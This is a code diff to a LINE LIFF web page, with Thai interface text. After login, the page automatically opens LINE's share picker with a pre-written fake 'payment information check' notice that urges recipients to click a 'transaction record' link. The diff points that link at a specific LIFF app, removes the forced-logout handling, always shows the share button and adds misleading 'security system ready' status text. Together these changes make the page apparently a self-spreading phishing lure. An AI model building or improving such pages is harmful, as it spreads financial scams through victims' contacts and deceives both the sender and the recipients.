@@ -11,7 +11,7 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h2 { margin-top: 0; color: #111; font-size: 22px; }
         p { color: #666; font-size: 15px; line-height: 1.5; }
-        .btn-share { background-color: #1DB446; color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 4px 10px rgba(29, 180, 70, 0.3); margin-top: 20px; display: block; margin-left: auto; margin-right: auto; }
+        .btn-share { background-color: #1DB446; color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 4px 10px rgba(29, 180, 70, 0.3); margin-top: 20px; display: none; margin-left: auto; margin-right: auto; }
     </style>
 </head>
 <body>
@@ -19,8 +19,8 @@
     <div class="card">
         <div class="loader" id="loading-icon"></div>
         <h2 id="title-text">🔄 ระบบส่งต่อข้อความ</h2>
-        <p id="status-text">กำลังตรวจสอบสิทธิ์ผู้ใช้งาน...</p>
-        <button class="btn-share" id="share-btn" style="display: none;" onclick="openSharePicker()">🟢 คลิกเปิดหน้าต่างแชร์เพื่อน</button>
+        <p id="status-text">กำลังเรียกเปิดระบบแชร์รายชื่อของ LINE กรุณารอสักครู่...</p>
+        <button class="btn-share" id="share-btn" onclick="openSharePicker()">🟢 คลิกเปิดหน้าต่างแชร์เพื่อนอีกครั้ง</button>
     </div>
 
     <script src="https://line-scdn.net"></script>
@@ -31,17 +31,9 @@
             if (typeof liff !== "undefined") {
                 liff.init({ liffId: MY_LIFF_ID })
                     .then(() => {
-                        // 🛠️ เช็คพารามิเตอร์เพื่อสั่ง Force Logout ล้าง Token เสีย
-                        const urlParams = new URLSearchParams(window.location.search);
-                        if (urlParams.has('logout') && liff.isLoggedIn()) {
-                            liff.logout();
-                            window.location.href = window.location.pathname; // โหลดหน้าใหม่แบบ Clean
-                            return;
-                        }
-
                         if (liff.isLoggedIn()) {
-                            document.getElementById("status-text").innerText = "ยืนยันสิทธิ์สำเร็จ กำลังเรียกหน้ารายชื่อเพื่อน...";
-                            openSharePicker();
+                            // 🛠️ ปรับปรุง: หน่วงเวลา 500ms เพื่อให้ UI ของ Android บิวต์หน้าจอทัน ป้องกันอาการค้างหมุน
+                            setTimeout(openSharePicker, 500);
                         } else {
                             liff.login();
                         }
@@ -58,10 +50,13 @@
 
         function openSharePicker() {
             if (liff.isApiAvailable('shareTargetPicker')) {
+                // ปรับสถานะข้อความบอกผู้ใช้
+                document.getElementById("status-text").innerText = "ระบบความปลอดภัยพร้อมใช้งานแล้ว...";
+                
                 liff.shareTargetPicker([
                     {
                         "type": "text",
-                        "text": "🔔 แจ้งตรวจสอบข้อมูลชำระเงินใหม่\n\nกรุณาคลิกดูรายละเอียดผ่านลิงก์บันทึกข้อมูลธุรกรรม:\nhttps://line.me"
+                        "text": "🔔 แจ้งตรวจสอบข้อมูลชำระเงินใหม่\n\nกรุณาคลิกดูรายละเอียดผ่านลิงก์บันทึกข้อมูลธุรกรรม:\nhttps://liff.line.me/2011437100-YADN8PIm"
                     }
                 ])
                 .then((res) => {
